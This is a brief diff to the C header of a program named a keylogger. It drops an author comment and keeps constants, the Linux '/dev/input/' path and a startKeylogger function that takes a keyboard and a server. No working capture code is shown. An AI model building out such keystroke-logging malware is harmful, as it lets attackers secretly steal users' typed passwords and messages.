@@ -1,4 +1,3 @@
-/* Developed by Fabio Cinicolo */
 #ifndef KEYLOGGER
 #define KEYLOGGER
 
@@ -7,7 +6,6 @@
 #define KEY_RELEASED 0
 #define KEY_REPEATED 2
 #define PATH "/dev/input/"
-
 typedef struct input_event event;
 
 void startKeylogger(int keyboard, int server);
